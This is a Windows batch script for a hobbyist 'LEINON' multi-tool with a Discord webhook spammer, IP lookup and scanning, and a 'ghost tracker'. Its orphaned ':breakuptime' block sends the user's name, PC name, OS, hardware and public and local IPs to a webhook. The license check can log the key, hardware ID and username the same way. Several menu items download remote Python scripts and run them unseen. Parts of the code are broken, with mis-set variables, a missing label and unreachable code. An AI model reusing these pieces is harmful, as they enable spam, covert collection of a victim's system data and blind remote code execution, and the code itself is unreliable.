@echo off
title LEINON - by shadowin4k
chcp 65001 >nul
setlocal enabledelayedexpansion

:: Set ESC character
for /f "delims=" %%i in ('powershell -command "[char]27"') do set "ESC=%%i"

:: Define menu colors as fake array
set "colors[0]=38;2;173;216;230"
set "colors[1]=38;2;145;190;240"
set "colors[2]=38;2;115;160;250"
set "colors[3]=38;2;85;130;255"
set "colors[4]=38;2;60;105;255"
set "colors[5]=38;2;40;80;250"
set "colors[6]=38;2;30;60;240"
set "colors[7]=38;2;50;40;200"
set "colors[8]=38;2;75;30;180"
set "colors[9]=38;2;100;20;160"
set "colors[10]=38;2;120;10;145"
set "colors[11]=38;2;128;0;128"
set "colors[12]=38;2;110;0;115"
set "colors[13]=38;2;90;0;105"
set "colors[14]=38;2;75;0;95"
set "colors[15]=38;2;60;0;90"

:License 
@echo off
setlocal EnableDelayedExpansion
title License Key Protected Script

:: List of valid keys
set "VALID_KEYS=00x12u2838u89djwc778dcnmcdc 00xsuhd798he87ghewyhdhasbds 00xy9q23d98qyus798yduashdau"

:: Files to track used keys
set "USED_KEYS_FILE=used_keys.txt"
set "HARDWARE_FILE=hardware.txt"

:: Retrieve the PC UUID (unique ID)
for /f "tokens=2 delims==" %%A in ('wmic csproduct get UUID /value 2^>nul') do set "HARDWARE_ID=%%A"

:: Input loop
:RETRY
cls
echo(
echo ██▓    ▓█████  ██▓ ███▄    █  ▒█████   ███▄    █     ▄▄▄       ▄████▄   ▄████▄  ▓█████   ██████   ██████ 
echo ▓██▒    ▓█   ▀ ▓██▒ ██ ▀█   █ ▒██▒  ██▒ ██ ▀█   █    ▒████▄    ▒██▀ ▀█  ▒██▀ ▀█  ▓█   ▀ ▒██    ▒ ▒██    ▒ 
echo ▒██░    ▒███   ▒██▒▓██  ▀█ ██▒▒██░  ██▒▓██  ▀█ ██▒   ▒██  ▀█▄  ▒▓█    ▄ ▒▓█    ▄ ▒███   ░ ▓██▄   ░ ▓██▄   
echo ▒██░    ▒▓█  ▄ ░██░▓██▒  ▐▌██▒▒██   ██░▓██▒  ▐▌██▒   ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▒▓▓▄ ▄██▒▒▓█  ▄   ▒   ██▒  ▒   ██▒
echo ░██████▒░▒████▒░██░▒██░   ▓██░░ ████▓▒░▒██░   ▓██░    ▓█   ▓██▒▒ ▓███▀ ░▒ ▓███▀ ░░▒████▒▒██████▒▒▒██████▒▒
echo ░ ▒░▓  ░░░ ▒░ ░░▓  ░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒     ▒▒   ▓▒█░░ ░▒ ▒  ░░ ░▒ ▒  ░░░ ▒░ ░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░
echo ░ ░ ▒  ░ ░ ░  ░ ▒ ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░     ▒   ▒▒ ░  ░  ▒     ░  ▒    ░ ░  ░░ ░▒  ░ ░░ ░▒  ░ ░
echo  ░ ░      ░    ▒ ░   ░   ░ ░ ░ ░ ░ ▒     ░   ░ ░      ░   ▒   ░        ░           ░   ░  ░  ░  ░  ░  ░  
echo    ░  ░   ░  ░ ░           ░     ░ ░           ░          ░  ░░ ░      ░ ░         ░  ░      ░        ░  
echo                                                               ░        ░                                 
set /p "LICENSE=Enter your license key: "

set "KEY_VALID=0"
for %%k in (%VALID_KEYS%) do (
    if /I "!LICENSE!"=="%%k" (
        set "KEY_VALID=1"
    )
)

if !KEY_VALID!==0 (
    echo.
    echo ERROR: Invalid license key.
    timeout /t 2 /nobreak >nul
    goto RETRY
)

set "KEY_MATCHED=0"
for /f "tokens=1,3 delims= " %%a in ('findstr /I "!LICENSE!" "%USED_KEYS_FILE%" 2^>nul') do (
    if "%%a"=="!LICENSE!" (
        if "%%b"=="!HARDWARE_ID!" (
            set "KEY_MATCHED=1"
        ) else (
            echo.
            echo ERROR: This license key is already used on another machine.
            timeout /t 2 /nobreak >nul
            goto RETRY
        )
    )
)

if !KEY_MATCHED!==0 (
    echo !LICENSE! - !HARDWARE_ID!>>"%USED_KEYS_FILE%"
    echo !LICENSE! - !HARDWARE_ID!>>"%HARDWARE_FILE%"
    echo.
    echo Access granted. Welcome!
) else (
    echo.
    echo Access granted. Welcome back!
)

if defined FULL_WEBHOOK (
    curl -s -X POST !FULL_WEBHOOK! ^
      -H "Content-Type: application/json" ^
      -d "{\"username\":\"License Logger\", \"content\":\"LICENSE USED: !LICENSE! - Hardware ID: !HARDWARE_ID! - %USERNAME%\"}" >nul
)

cls
echo Protected script running...
pause

:banner
cls
echo(
echo                                                    %ESC%[38;5;81m============================%ESC%[0m
echo                                                    %ESC%[38;5;69m         WELCOME TO         %ESC%[0m
echo                                                    %ESC%[38;5;99m============================%ESC%[0m
echo(                                                                                                                   
echo                                          %ESC%[38;5;81m██╗     ███████╗██╗███╗   ██╗ ██████╗ ███╗   ██╗%ESC%[0m
echo                                          %ESC%[38;5;69m██║     ██╔════╝██║████╗  ██║██╔═══██╗████╗  ██║%ESC%[0m
echo                                          %ESC%[38;5;99m██║     █████╗  ██║██╔██╗ ██║██║   ██║██╔██╗ ██║%ESC%[0m
echo                                          %ESC%[38;5;135m██║     ██╔══╝  ██║██║╚██╗██║██║   ██║██║╚██╗██║%ESC%[0m
echo                                          %ESC%[38;5;127m███████╗███████╗██║██║ ╚████║╚██████╔╝██║ ╚████║%ESC%[0m
echo                                          %ESC%[38;5;91m╚══════╝╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝%ESC%[0m
echo(
echo                                          %ESC%[38;5;127mLEINON by - shadowin4k%ESC%[0m
echo(
echo %ESC%[38;5;127mPress any key to continue...
pause >nul
goto menu

:: Menu Display
:menu
cls
set /a i=0
echo(
echo                                              %ESC%[38;5;81m██╗     ███████╗██╗███╗   ██╗ ██████╗ ███╗   ██╗%ESC%[0m
echo                                              %ESC%[38;5;69m██║     ██╔════╝██║████╗  ██║██╔═══██╗████╗  ██║%ESC%[0m
echo                                              %ESC%[38;5;99m██║     █████╗  ██║██╔██╗ ██║██║   ██║██╔██╗ ██║%ESC%[0m
echo                                              %ESC%[38;5;135m██║     ██╔══╝  ██║██║╚██╗██║██║   ██║██║╚██╗██║%ESC%[0m
echo                                              %ESC%[38;5;127m███████╗███████╗██║██║ ╚████║╚██████╔╝██║ ╚████║%ESC%[0m
echo                                              %ESC%[38;5;91m╚══════╝╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝%ESC%[0m
echo(
call :colorLine 0 "             ┌─                                                                                                    ─┐"
call :colorLine 1 "             │                                                ┌────────┐                                            │"
call :colorLine 2 "             └─┬──────────────────────────────────────────────┤  MENU  ├───────────────────────────────────────────┬┘"
call :colorLine 3 "               │                                              └────────┘                                           │"
call :colorLine 4 "               ├─ [1][+] Go back                 ┌─ [10][+] IP Scanner            ┌─ Coming Soon                   │"
call :colorLine 5 "               ├─ [2][+] Webhook Spammer         ├─ [11][+] Exit                  ├─ Coming Soon                   │"
call :colorLine 6 "               ├─ [3][+] Our Discord             ├─ Coming Soon                   ├─ Coming Soon                   │"
call :colorLine 7 "               ├─ [4][+] Message Webhook         ├─ Coming Soon                   ├─ Coming Soon                   │"
call :colorLine 8 "               ├─ [5][+] Roblox User Info        ├─ Coming Soon                   ├─ Coming Soon                   │"
call :colorLine 9 "               ├─ [6][+] Server Info             ├─ Coming Soon                   ├─ Coming Soon                   │"
call :colorLine 10 "               ├─ [7][+] Ghost tracker           ├─ Coming Soon                   ├─ Coming Soon                   │"
call :colorLine 11 "               ├─ [8][+] Cool Utility            ├─ Coming Soon                   ├─ Coming Soon                   │"
call :colorLine 12 "               ├─ [9][+] IP Lookup               ├─ Coming Soon                   ├─ Coming Soon                   │"
call :colorLine 13 "               └─────────────────────────────────┴────────────────────────────────┴────────────────────────────────┘"
echo(
set /p "userChoice=%ESC%[38;5;99mSelect an option (1-11): "%ESC%[0m

:: Handle selection
if "%userChoice%"=="1" goto Go_back
if "%userChoice%"=="2" goto Webhook_spammer
if "%userChoice%"=="3" goto Our_Discord
if "%userChoice%"=="4" goto Message_Webhook
if "%userChoice%"=="5" goto RobloxUserInfo
if "%userChoice%"=="6" goto Server_info
if "%userChoice%"=="7" goto Ghost_tracker
if "%userChoice%"=="8" goto Cool_Utility
if "%userChoice%"=="9" goto iplookup
if "%userChoice%"=="10" goto ip_scan
if "%userChoice%"=="11" exit

echo Invalid option. Try again.
timeout /t 2 >nul
goto menu

:: Subroutine to display colored lines
:colorLine
set "colorCode=!colors[%1%]!"
echo %ESC%[!colorCode!m%~2%ESC%[0m
goto :eof

:Go_back
cls
call :banner
pause >nul
goto menu

:Webhook_spammer
cls
set /p "webhook=Enter your Discord Webhook URL: "
if not defined webhook goto menu
set /p "message=Enter the message to send: "
if not defined message goto menu
set /p "num=Enter number of times to send: "
if not defined num goto menu

for /l %%i in (1,1,%num%) do (
    echo Sending message %%i...
    curl -s -X POST -H "Content-Type: application/json" -d "{\"content\":\"%message%\"}" %webhook%
)

echo Done.
pause >nul
goto menu

:Our_Discord
cls
echo Opening Discord server...
explorer "https://discord.gg/D3WxpwF74D"
timeout /t 2 >nul
echo Press any key to return to the menu...
pause >nul
goto menu

:Message_Webhook
cls
set /p "webhook=Enter your Discord Webhook URL: "
if not defined webhook goto menu
set /p "message=Enter the message to send: "
if not defined message goto menu

echo Sending message...
curl -s -X POST -H "Content-Type: application/json" -d "{\"content\":\"%message%\"}" %webhook%
echo Done.
pause >nul
goto menu
:RobloxUserInfo
cls
setlocal EnableDelayedExpansion

:: === Config ===
set "SCRIPT_URL=https://raw.githubusercontent.com/shadowin4k/RobloxUserInfo.py/refs/heads/main/RobloxUserInfo.py"
set "SCRIPT_NAME=RobloxUserInfo.py"
set "WORKDIR=%~dp0"
cd /d "%WORKDIR%"

:: === Check Python ===
where python >nul 2>&1
if %errorlevel% neq 0 (
    echo.
    echo [ERROR] Python not found in PATH.
    echo Download it from: https://www.python.org/downloads/
    pause
    exit /b
)

:: === Download main script if missing ===
if not exist "%SCRIPT_NAME%" (
    echo Downloading main script...
    powershell -Command "Invoke-WebRequest -Uri '%SCRIPT_URL%' -OutFile '%SCRIPT_NAME%' -UseBasicParsing"
)

:: === Required Python modules ===
set "requests=colorama requests"

:: === Install required modules ===
echo.
echo Installing required Python modules...
for %%M in (%REQUIRED_MODULES%) do (
    echo Installing %%M...
    python -m pip install %%M >nul 2>&1
    if errorlevel 1 (
        echo [ERROR] Failed to install %%M. Please check your Python/pip setup.
    ) else (
        echo [OK] %%M installed successfully.
    )
)

:: === Launch main Python script ===
cls
echo.
echo Roblox User Info Tool...
python "%SCRIPT_NAME%"

pause
goto menu
:server_info
cls
setlocal EnableDelayedExpansion

:: === Config ===
set "SCRIPT_URL=https://raw.githubusercontent.com/shadowin4k/discord-server-info/refs/heads/main/discord%%20server%%20info.py"
set "SCRIPT_NAME=discord server info.py"
set "WORKDIR=%~dp0"
cd /d "%WORKDIR%"

:: === Check Python ===
where python >nul 2>&1
if %errorlevel% neq 0 (
    echo.
    echo [ERROR] Python not found in PATH.
    echo Download it from: https://www.python.org/downloads/
    pause
    exit /b
)

:: === Download main script if missing ===
if not exist "%SCRIPT_NAME%" (
    echo Downloading main script...
    powershell -Command "Invoke-WebRequest -Uri '%SCRIPT_URL%' -OutFile '%SCRIPT_NAME%' -UseBasicParsing"
)

:: === Required Python modules ===
set "REQUIRED_MODULES=colorama requests"

:: === Install required modules ===
echo.
echo Installing required Python modules...
for %%M in (%REQUIRED_MODULES%) do (
    echo Installing %%M...
    python -m pip install %%M >nul 2>&1
    if errorlevel 1 (
        echo [ERROR] Failed to install %%M. Please check your Python/pip setup.
    ) else (
        echo [OK] %%M installed successfully.
    )
)

:: === Launch main Python script ===
cls
echo.
echo Starting Discord Server Info Tool...
python "%SCRIPT_NAME%"

pause
goto menu
:ghost_tracker
cls
setlocal EnableDelayedExpansion

:: === Config ===
set "SCRIPT_URL=https://raw.githubusercontent.com/shadowin4k/ghost-tracker-/refs/heads/main/ghost-tracker.py"
set "SCRIPT_NAME=ghost-tracker.py"
set "WORKDIR=%~dp0"
cd /d "%WORKDIR%"

:: === Check Python ===
where python >nul 2>&1
if %errorlevel% neq 0 (
    echo.
    echo [ERROR] Python not found in PATH.
    echo Download: https://www.python.org/downloads/
    pause
    exit /b
)

:: === Download main script ===
if not exist "%SCRIPT_NAME%" (
    echo Downloading main script...
    powershell -Command "Invoke-WebRequest -Uri '%SCRIPT_URL%' -OutFile '%SCRIPT_NAME%' -UseBasicParsing"
)

:: === Required modules and models ===
:: Add Python modules and models here
set "phonenumbers colorama dotenv requests=requests colorama keyboard model.onnx"

:: === Install or download each item ===
echo Installing required modules or downloading files...

for %%M in (%REQUIRED_MODULES%) do (
    echo.
    echo Processing %%M...
    python -m pip install %%M >nul 2>&1
    if errorlevel 1 (
        echo [INFO] %%M not found on pip. Attempting download...
        set "MODEL_URL=https://raw.githubusercontent.com/shadowin4k/ghost-tracker-/refs/heads/main/%%M"
        powershell -Command "Invoke-WebRequest -Uri '!MODEL_URL!' -OutFile '%%M' -UseBasicParsing"
    ) else (
        echo [OK] Installed %%M
    )
)

:: === Launch main Python script ===
cls
echo.
echo Starting Ghost Tracker...
python "%SCRIPT_NAME%"

pause
goto menu
:breakuptime
set "uptime=!bootraw:~0,4!-!bootraw:~4,2!-!bootraw:~6,2! !bootraw:~8,2!:!bootraw:~10,2!:!bootraw:~12,2!"

(
echo {
echo   "username": "System Info Bot",
echo   "content": "**System Info Report**",
echo   "embeds": [
echo     {
echo       "title": "LEINON Report",
echo       "color": 3447003,
echo       "fields": [
echo         { "name": "User", "value": "!username!", "inline": true },
echo         { "name": "PC", "value": "!pcname!", "inline": true },
echo         { "name": "OS", "value": "!osver!", "inline": false },
echo         { "name": "CPU", "value": "!cpu!", "inline": false },
echo         { "name": "RAM", "value": "!R! MB", "inline": true },
echo         { "name": "Public IP", "value": "!P!", "inline": false },
echo         { "name": "Local IP", "value": "!elp!", "inline": false },
echo         { "name": "Last Boot Time", "value": "!uptime!", "inline": false }
echo       ]
echo     }
echo   ]
echo }
) > payload.json

move /Y payload.json "%USERPROFILE%\Downloads\payload.json" >nul
curl -H "Content-Type: application/json" -X POST --data "@%USERPROFILE%\Downloads\payload.json" "!wbhk!" >nul 2>&1

echo File sent successfully to Downloads.
pause
goto menu
:iplookup 
cls
setlocal EnableDelayedExpansion

:: === Config ===
set "SCRIPT_URL=https://raw.githubusercontent.com/shadowin4k/iplookup/refs/heads/main/iplookup.py"
set "SCRIPT_NAME=iplookup.py"
set "WORKDIR=%~dp0"
cd /d "%WORKDIR%"

:: === Check Python ===
where python >nul 2>&1
if %errorlevel% neq 0 (
    echo.
    echo [ERROR] Python not found in PATH.
    echo Download: https://www.python.org/downloads/
    pause
    exit /b
)

:: === Download main script ===
if not exist "%SCRIPT_NAME%" (
    echo Downloading main script...
    powershell -Command "Invoke-WebRequest -Uri '%SCRIPT_URL%' -OutFile '%SCRIPT_NAME%' -UseBasicParsing"
)

:: === Required modules and models ===
:: Add Python modules and models here
set "dotenv requests=requests colorama keyboard model.onnx"

:: === Install or download each item ===
echo Installing required modules or downloading files...

for %%M in (%REQUIRED_MODULES%) do (
    echo.
    echo Processing %%M...
    python -m pip install %%M >nul 2>&1
    if errorlevel 1 (
        echo [INFO] %%M not found on pip. Attempting download...
        set "MODEL_URL=https://raw.githubusercontent.com/shadowin4k/iplookup/refs/heads/main/%%M"
        powershell -Command "Invoke-WebRequest -Uri '!MODEL_URL!' -OutFile '%%M' -UseBasicParsing"
    ) else (
        echo [OK] Installed %%M
    )
)

:: === Launch main Python script ===
cls
echo.
echo Starting IP Lookup...
python "%SCRIPT_NAME%"

pause
goto menu
:ip_scan
cls
setlocal EnableDelayedExpansion

:: === Config ===
set "SCRIPT_URL=https://raw.githubusercontent.com/shadowin4k/ipscan.py/refs/heads/main/ipscan.py"
set "SCRIPT_NAME=ipscan.py"
set "WORKDIR=%~dp0"
cd /d "%WORKDIR%"

:: === Check Python ===
where python >nul 2>&1
if %errorlevel% neq 0 (
    echo.
    echo [ERROR] Python not found in PATH.
    echo Download: https://www.python.org/downloads/
    pause
    exit /b
)

:: === Download main script ===
if not exist "%SCRIPT_NAME%" (
    echo Downloading main script...
    powershell -Command "Invoke-WebRequest -Uri '%SCRIPT_URL%' -OutFile '%SCRIPT_NAME%' -UseBasicParsing"
)

:: === Required modules and models ===
:: Add Python modules and models here
set "colorama dotenv requests=requests colorama keyboard model.onnx"

:: === Install or download each item ===
echo Installing required modules or downloading files...

for %%M in (%REQUIRED_MODULES%) do (
    echo.
    echo Processing %%M...
    python -m pip install %%M >nul 2>&1
    if errorlevel 1 (
        echo [INFO] %%M not found on pip. Attempting download...
        set "MODEL_URL=https://raw.githubusercontent.com/shadowin4k/ipscan.py/refs/heads/main/%%M"
        powershell -Command "Invoke-WebRequest -Uri '!MODEL_URL!' -OutFile '%%M' -UseBasicParsing"
    ) else (
        echo [OK] Installed %%M
    )
)

:: === Launch main Python script ===
cls
echo.
echo Starting IP Scan...
python "%SCRIPT_NAME%"

pause
goto menu
:exit
cls
echo Exiting... See you soon!
timeout /t 2 >nul
exit
